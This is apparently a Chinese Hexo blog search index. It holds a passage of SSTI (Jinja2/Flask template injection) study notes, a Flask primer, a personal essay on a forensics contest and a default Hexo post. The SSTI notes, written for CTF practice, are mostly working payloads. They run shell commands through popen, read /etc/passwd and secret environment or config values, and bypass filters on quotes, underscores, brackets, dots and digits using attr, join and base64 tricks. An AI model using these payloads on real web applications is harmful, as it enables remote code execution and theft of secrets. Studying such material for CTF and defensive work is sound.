&#123;().__class__.__base__.__subclasses__()[117]&#125;.__init__.__globals__[&#39;popen&#39;](&#39;cat flag&#39;).read()&#125;\npayload：\n&#123; %set a&#x3D;dict(__class__&#x3D;1)|join% &#125;\n&#123; %set b&#x3D;dict(__base__&#x3D;1)|join% &#125;\n&#123; %set c&#x3D;dict(__subclasses__&#x3D;1)|join% &#125;\n&#123; %set d&#x3D;dict(__getitem__&#x3D;1)|join% &#125;\n&#123; %set e&#x3D;dict(__in&#x3D;1,it&#x3D;2)|join% &#125;\n&#123; %set f&#x3D;dict(__glo&#x3D;1,bals__&#x3D;2)|join% &#125;\n&#123; %set g&#x3D;dict(popen&#x3D;1)|join% &#125;\n&#123; %set kg&#x3D;&#123;&#125;|select()|string()|attr(d)(10)% &#125;     #空格\n&#123; %set i&#x3D;(dict(cat&#x3D;1)|join,kg,dict(flag&#x3D;2)|join)|join% &#125;\n&#123; %set r&#x3D;dict(read&#x3D;1)|join% &#125;\n&#123; &#123;()|attr(a)|attr(b)|attr(c)|attr(d)(117)|attr(e)|attr(f)|attr(d)(g)(i)|attr(r)()&#125; &#125;\n示例2：WAF过滤  &#39;,&quot;,&#39;_&#39;,&#39;0-9&#39;,&#39;.&#39;,&#39;[&#39;,&#39;]&#39;.&#39;\\&#39;,&#39;&#39;\npaylaod原型:&#123; &#123;lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__item__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()&#125; &#125;\npayload:\n&#123; %set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count% &#125;\n&#123; %set eighteen&#x3D;nine+nine% &#125;\n&#123; %set pop&#x3D;dict(pop&#x3D;a)|join% &#125;\n&#123; %set xhx&#x3D;(lipsum|string|list)|attr(pop)(eighteen)% &#125;\n&#123; %set kg&#x3D;(lipsum|string|list)|attr(pop)(nine)% &#125;\n#得到下划线xhx&#39;_&#39;和空格kg&#39; &#39;\n&#123; %set globals&#x3D;(xhx,xhx,dict(globals&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set getitem&#x3D;(xhx,xhx,dict(getitem&#x3D;a)|join,xhx,xhx)|join% &#125;\n&#123; %set os&#x3D;dict(os&#x3D;a)|join% &#125;\n&#123; %set popen&#x3D;dict(popen&#x3D;a)|join% &#125;\n&#123; %set flag&#x3D;(dict(cat&#x3D;a)|join,kg,dict(flag&#x3D;a)|join)|join&#125;\n&#123; %set read&#x3D;dict(read&#x3D;a)|join&#125;\n&#123; &#123;lipsum|attr(globals)|attr(getitem)(os)|attr(popen)(flag)|attr(read)()&#125; &#125;\n\n姿势集(来源https://zhuanlan.zhihu.com/p/93746437)\n1.{ {config} } 可以获取当前设置，如果题目是这样的：app.config [&#39;FLAG&#39;] &#x3D; os.environ.pop（&#39;FLAG&#39;）\n\n可以直接访问 { {config[‘FLAG’]} } 或者 { {config.FLAG} } 得到 flag。\n2.同样可以找到 config。&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取当前 Flask 应用程序上下文中的配置信息。\n&#96;self&#96; 表示模板上下文对象，&#96;__dict__&#96; 返回该对象储存的属性和值的字典，\n&#96;_TemplateReference__context&#96; 是表示调用上下文槽时使用的内部插槽名称。\n最终访问 &#96;config&#96; 属性可以得到应用程序的配置信息。\n&#39;&#39;&#39;\n\n3.环境变量&#123; &#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#125; &#125;\n&#39;&#39;&#39;\n这段代码可以用于获取 Flask 程序中环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n首先创建一个空列表 &#96;[]&#96;，然后通过 &#96;. __class__&#96; 获取它的类 &#96;&lt;class &#39;list&#39;&gt;&#96;。\n再通过 &#96;.__base__&#96; 方法获取其基础类，即 &#96;&lt;class &#39;object&#39;&gt;&#96;。\n接着通过 &#96;.__subclasses__()&#96; 方法获取所有子类，得到一个列表。\n然后查询这个列表中下标为 &#96;68&#96; 的子类，得到 &#96;&lt;class &#39;posix.ScandirIterator&#39;&gt;&#96;。\n对该子类的 &#96;__init__&#96; 初始化函数进行取值并访问 &#96;__globals__[&#39;os&#39;].__dict__[&#39;environ&#39;][&#39;FLAG&#39;]&#96; \n就可以获取环境变量 &#96;&#39;FLAG&#39;&#96; 的值。\n&#39;&#39;&#39;\n\n4.url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等这是 Flask 中一些常用的对象或方法：\n&#39;&#39;&#39;\n- &#96;url_for&#96;：生成 URL。\n- &#96;g&#96;：应用程序上下文中存储数据的齿轮。在请求之间共享数据。\n- &#96;request&#96;：表示客户端发出的请求。\n- &#96;namespace&#96;：命名空间，常常用于优化 url_for。\n- &#96;lipsum&#96;：快速生成 Lorem Ipsum 文本。\n- &#96;range&#96;：Python 内置函数，用于生成一个固定区间内的整数序列。\n- &#96;session&#96;：应用程序上下文中用户会话存储数据的地方。在请求之间共享数据。\n- &#96;dict&#96;：Python 内置类型，字典类型，用于保存键-值对。\n- &#96;get_flashed_messages&#96;：从请求中弹出闪现消息。\n- &#96;cycler&#96;：Matplotlib 库中的循环器，用于对颜色、线条风格等元素进行迭代访问。\n- &#96;joiner&#96;：用于拼接字符串。\n- &#96;config&#96;：Flask 应用程序全局配置。\n&#39;&#39;&#39;\n\n如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：\n&#123; &#123;url_for.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#url_for.__globals__[&#39;current_app&#39;]，表示获取当前应用程序实例中的全局变量；\n#然后通过 config.FLAG 获取环境变量 FLAG 的值。\n&#123; &#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config.FLAG&#125; &#125;\n#get_flashed_messages.__globals__[&#39;current_app&#39;]，同样表示获取当前应用程序实例中的全局变量；\n#然后再次通过 config.FLAG 获取环境变量 FLAG 的值。\n#该函数主要用于传递闪现消息给用户，而在这里被“利用”以获取环境变量。\n&#123; &#123;request.application.__self__._get_data_for_json.__globals__[&#39;json&#39;].JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125; &#125;\n#在获取到 request 对象和 current_app 对象后，使用 _get_data_for_json() 方法将请求数据编码为 json 格式，\n#并使用 json 库进行编码。由于 flask 使用了自定义的 JSONEncoder 类，\n#所以我们通过 json.JSONEncoder.default.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;] 来访问环境变量。\n\n5.过滤了 []、.pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。\n&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#39;&#x2F;etc&#x2F;passwd&#39;).read()\n\n在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。\n若.也被过滤，使用原生 JinJa2 函数 |attr()\n即将 request.__class__ 改成 request|attr(&quot;__class__&quot;)\n6.过滤下划线 _利用 request.args 的属性\n\n&#123; &#123; &#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。\nGET:\n\n&#123; &#123; &#39;&#39;[request.value.class][request.value.mro][2][request.value.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125; &#125;\n\nPOST:\nclass&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__\n\n7.过滤引号 “request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。\n&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;path&#x3D;&#x2F;etc&#x2F;passwd\n\n8.一些关键字被过滤。base64编码绕过用于__getattribute__使用实例访问属性时。\n例如，过滤掉 __class__ 关键词\n&#123; &#123;[].__getattribute__(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;)).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n\n字符串拼接绕过\n&#123; &#123;[].__getattribute__(&#39;__c&#39;+&#39;lass__&#39;).__base__.__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;).read()&#125; &#125;\n&#123; &#123;[].__getattribute__([&#39;__c&#39;,&#39;lass__&#39;]|join).__base__.__subclasses__()[40]&#125; &#125; ","slug":"ssti1","date":"2023-04-21T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"1e1792beaab2c135cf1beec290eff7af","title":"ssti模板注入学习笔记-flask前置知识","content":"flask是一个使用python编写的轻量级web应用框架\npython可以直接用flask启动一个web服务页面\ncd &#x2F;opt&#x2F;flask1\nsource .&#x2F;bin&#x2F;activate\ncd &#x2F;root\nvim demo.py\npython3 demo.py\n\n其中demo.py文件:\nfrom flask import Flask     #启动flask模块，创建一个Flask类\napp &#x3D; Flask(__name__)       #__name__是系统变量，指的是本py文件的文件名\n\n#路由：基于浏览器输入的字符串寻址\n@app.route(&#39;&#x2F;world&#39;)             \ndef hello():\n    return &quot;hello world&quot;\n@app.route(&#39;&#x2F;man&#39;)             \ndef hello():\n    return &quot;hello man&quot;\n\n#只能被python直接运行，而不能被作为组件或模块被调用\nif __name__&#x3D;&#x3D;&#39;__main__&#39;: \n    app.run(debug&#x3D;True,host&#x3D;&quot;0.0.0.0&quot;,port&#x3D;8081)      #改完配置自动生效\n    #debug建议只能在学习中开启  host&#x3D;&quot;0.0.0.0&quot;监听所有的物理接口\n\nflask变量规则通过向规则参数添加变量部分，可以动态构建URL\nfrom flask import Flask\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)\ndef hello(name):\n    return &quot;hello %s&quot; % name\n@app.route(&#39;int&#x2F;&lt;ID&gt;&#39;)\ndef hello(ID):\n    return &quot;hello %d&quot; % ID\n\nif __name__&#x3D;&#x3D;&#39;__main__&#39;:\n    app.run(debug&#x3D;True)\n\nflask HTTP方法在python demo.py中插入路由:\n@app.route(&#39;&#x2F;login&#39;,methods&#x3D;[&#39;POST&#39;,&#39;GET&#39;])\ndef login():\n    if request.method &#x3D;&#x3D; &#39;POST&#39;:\n        print(1)\n        user &#x3D; request.form[&#39;ben&#39;]\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))     #redirect重定向\n    else:\n        print(2)\n        user &#x3D; request.args.get(&#39;ben&#39;)\n        return redirect(url_for(&#39;success&#39;,name &#x3D; user))\n\nflask模板视图函数：主要作用是生成请求的相应把业务逻辑和表现内容放在一起，会增加代码的复杂度和维护成本\n使用模板：使用静态的页面html展示动态的内容模板是一个响应文本的文件，其中使用占位符（变量）表示动态部分。代码结构清晰，耦合度低\n· 处理业务逻辑：视图函数只负责业务逻辑和数据处理\n· 返回相应内容：模板取到视图函数的数据结果来进行展示\n\nrender_template加载html文件，默认文件路径在templates目录下。\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    return render_template(&quot;index.html&quot;)\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\n在templates目录下创建index.html文件\n&lt;html lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n    &lt;title&gt;Title&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    模板html展示页面\n&lt;br&gt;\n    &#123;&#123;my_str&#125;&#125;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n两者结合：\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;dazhuang&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template(&quot;index.html&quot;,\n    my_str&#x3D;my_str,\n    my_int&#x3D;my_int,\n    my_arry&#x3D;my_array,\n    my_dict&#x3D;my_dict\n    )\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\nrender_template_string用于渲染字符串，直接定义内容\nfrom flask import Flask,render_template\napp &#x3D; Flask(__name__)\n@app.route(&#39;&#x2F;&#39;)\ndef index():\n    my_str &#x3D; &#39;Hello world&#39;\n    my_int &#x3D; 12\n    my_array &#x3D; [5,2,0,1,3,1,4]\n    my_duct &#x3D; &#123;\n        &#39;name&#39; &#x3D; &#39;nannan&#39;,\n        &#39;age&#39;:18\n    &#125;\n    return render_template_string(&#39;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;title&gt;Title&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;模板html展示页面&lt;br&gt;%d&lt;br&gt;%s&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39; % (my_int,my_str))\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    app.run()\n\npython中的继承关系父类和子类（子类调用父类下的其他子类）~python flask脚本没有办法直接执行python指令object是父子关系的顶端，所有数据类型最终的父类都是object\nclass A:pass\nclass B(A):pass\nclass C(B):pass\nclass D(B):pass\nc &#x3D; c()\n\nprint(c.__class__)                              # &lt;class &#39;__main__.C&#39;&gt; 当前类C\nprint(c.__class__.__base__)                     # &lt;class &#39;__main__.B&#39;&gt; 当前类的父类B\nprint(c.__class__.__base__.__base__)            # &lt;class &#39;__main__.A&#39;&gt;\nprint(c.__class__.__base__.__base__.__base__)   # &lt;class &#39;object&#39;&gt;\nprint(c.__class__.__mro__)                      # 上面四个层层递进一起输出\nprint(c.__class__.__base__.__subclasses__())    # B下的所有子类（数组形式）\nprint(c.__class__.__base__.__subclasses__()[1]) #调用子类D\n\n魔术方法__class__           #查找当前类型的所属对象\n__base__            #沿着父子类的关系往上走一个\n__mro__             #查找当前类对象的所有继承类\n__subclasses__()    #查找父类下的所有子类\n\n简单的payload（注意类型）\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()&#125;&#125;    #str类型\n&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;    #list类型\n&#123;&#123;().__class__.__base__.__subclasses__()&#125;&#125;    #元组类型\n\n然后，寻找一些关键的模块\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()&#125;&#125;\n#例如：os.wrap_close       #找到对应的列数\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117]&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;\n# __builtins__提供对python的所有&quot;内置&quot;标识符的直接访问\n# eval()计算字符串表达式的值\n# popen()执行一个shell以运行命令来开启一个进程\n&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat &#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;\n#这里也可以直接调用\n\n\n\n\n","slug":"flask_study","date":"2023-04-14T10:49:36.000Z","categories_index":"文章","tags_index":"ssti模板注入","author_index":"南瓜の无名"},{"id":"d183dfb007b882d9bb397f4054d5a867","title":"2023首届盘古石杯结束后的随想","content":"刚刚结束了“盘古石”杯电子取证的比赛，是一场很精彩的比赛，数字取证也许漫长而枯燥，但是对于我这种同样无趣的人来说，反而是一种乐趣。看着发光的电脑屏幕，突然有一种想哭的感觉，似乎是什么都没有改变，一切又已经截然不同。同样是题目做不出来，同样是临近收卷时的心悸，可是却已波澜不惊。我担心，这已经是一种习惯了，但是桌面留下的痕迹告诉我不是。因为报名的晚，所以是一个人参与的，理论上五个小时的话，如果很厉害的人是可以都做完的。显然，我不是很厉害的人。承认自己会失败时很重要的，但更重要的时学习如何去弥补，我想对曾经逃避不敢正视未来的自己说，你真棒，完成了第一步，然后，剩下的答案就交给当下的我去书写吧。能做出来的题都是一眼能看出来答案的题目，但是从纷乱的数据中找出线索很有成就感，可不是谁都可以连续五个小时坐在电脑前一动不动盯着屏幕的！尝试真的很重要，记得第一次护网面试的时候紧张的语无伦次，第二次就已经可以泰然处之了。如果尝试过后所获得的经验远大于面对未知的恐惧，那么少年，勇敢的向前走吧！无论是盘古石还是火眼，数字取证的工具都很好用，但是正确的使用方法也很重要，错误的使用工具大概是每一个初学者都会犯的错误，比如我。有一些题目如果晚一些交就好了，明明可以作对的，有些不该犯的错误要避免。下一次，会更好的。就像人来人往的街道一般，感觉时间过的好快，最近都有些忙不过来，放弃是很简单的一件事，可是真的放弃了，反而会怅然若失吧。嗯，是时间去做一些更有意义的事情了，我收起了电脑，我的达摩克利斯之剑，挺身站起——也许有一天，这个世界真的会因为我的改变，没有了哭声。\n","slug":"盘古石赛后感","date":"2023-05-06T07:49:36.000Z","categories_index":"无用空间","tags_index":"随想","author_index":"南瓜の无名"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2023-05-05T05:50:17.266Z","categories_index":"test","tags_index":"test","author_index":"南瓜の无名"}]